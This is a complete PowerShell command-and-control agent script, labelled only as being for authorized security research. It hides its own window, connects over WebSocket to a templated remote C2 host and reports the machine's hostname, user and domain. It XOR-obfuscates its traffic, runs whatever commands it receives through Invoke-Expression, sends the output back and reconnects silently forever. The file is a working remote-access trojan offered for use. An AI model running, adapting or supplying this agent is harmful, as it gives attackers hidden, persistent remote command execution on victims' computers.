# PowerShell C2 Agent - For authorized security research only
$C2_HOST = "{{C2_HOST}}"
$C2_PORT = {{C2_PORT}}
$RECONNECT_DELAY = 5

function Invoke-XOREncryption {
    param([string]$Data)
    $key = [System.Text.Encoding]::UTF8.GetBytes('C2_SECRET_KEY_CHANGE_THIS')
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $encrypted = New-Object byte[] $dataBytes.Length
    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
        $encrypted[$i] = $dataBytes[$i] -bxor $key[$i % $key.Length]
    }
    return [Convert]::ToBase64String($encrypted)
}

function Invoke-XORDecryption {
    param([string]$Data)
    $key = [System.Text.Encoding]::UTF8.GetBytes('C2_SECRET_KEY_CHANGE_THIS')
    $dataBytes = [Convert]::FromBase64String($Data)
    $decrypted = New-Object byte[] $dataBytes.Length
    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
        $decrypted[$i] = $dataBytes[$i] -bxor $key[$i % $key.Length]
    }
    return [System.Text.Encoding]::UTF8.GetString($decrypted)
}

function Get-SystemMetadata {
    $metadata = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        os = "Windows"
        os_version = [System.Environment]::OSVersion.VersionString
        architecture = $env:PROCESSOR_ARCHITECTURE
        domain = $env:USERDOMAIN
    }
    return $metadata
}

function Invoke-Command {
    param([string]$Command)
    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        if ([string]::IsNullOrEmpty($output)) {
            return "Command executed successfully (no output)"
        }
        return $output
    } catch {
        return "Error: $($_.Exception.Message)"
    }
}

function Start-Agent {
    $uri = "ws://${C2_HOST}:${C2_PORT}"

    while ($true) {
        try {
            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            $ct = New-Object System.Threading.CancellationToken

            $task = $ws.ConnectAsync($uri, $ct)
            while (-not $task.IsCompleted) {
                Start-Sleep -Milliseconds 100
            }

            # Register
            $metadata = Get-SystemMetadata
            $registerMsg = @{
                type = "register"
                metadata = $metadata
            } | ConvertTo-Json -Compress

            $encrypted = Invoke-XOREncryption -Data $registerMsg
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
            $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
            $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct)
            while (-not $task.IsCompleted) {
                Start-Sleep -Milliseconds 100
            }

            # Receive loop
            $buffer = New-Object byte[] 4096
            while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
                $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$buffer)
                $task = $ws.ReceiveAsync($segment, $ct)
                while (-not $task.IsCompleted) {
                    Start-Sleep -Milliseconds 100
                }

                if ($task.Result.Count -gt 0) {
                    $received = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $task.Result.Count)
                    $decrypted = Invoke-XORDecryption -Data $received
                    $data = $decrypted | ConvertFrom-Json

                    if ($data.type -eq "command") {
                        $output = Invoke-Command -Command $data.command

                        $response = @{
                            type = "response"
                            output = $output
                        } | ConvertTo-Json -Compress

                        $encrypted = Invoke-XOREncryption -Data $response
                        $bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
                        $segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
                        $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct)
                        while (-not $task.IsCompleted) {
                            Start-Sleep -Milliseconds 100
                        }
                    }
                }
            }

            $ws.Dispose()

        } catch {
            # Silent fail and reconnect
        }

        Start-Sleep -Seconds $RECONNECT_DELAY
    }
}

# Hide PowerShell window
$windowcode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
try {
    Add-Type -MemberDefinition $windowcode -Name "Win32ShowWindowAsync" -Namespace Win32Functions
    $hwnd = (Get-Process -PID $PID).MainWindowHandle
    [Win32Functions.Win32ShowWindowAsync]::ShowWindow($hwnd, 0) | Out-Null
} catch {}

Start-Agent
